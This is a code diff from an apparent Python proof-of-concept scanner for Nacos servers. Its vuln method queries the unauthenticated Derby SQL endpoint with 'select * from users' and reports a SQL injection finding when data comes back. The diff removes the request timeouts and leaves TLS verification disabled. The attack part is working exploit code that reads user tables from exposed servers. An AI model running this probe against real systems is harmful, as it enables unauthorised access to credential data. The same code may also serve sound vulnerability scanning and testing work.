@@ -44,7 +44,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if result.status_code == 200:
                 if result.json()['data']:
                     target = urlparse(url)
@@ -58,7 +58,7 @@ class poc:
                     return False
             elif result.status_code == 404:
                 url = "{}://{}/v1/cs/ops/derby?sql=select%20*%20from%20users".format(scheme, netloc)
-                result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
                 if result.json()['data']:
                     target = urlparse(url)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
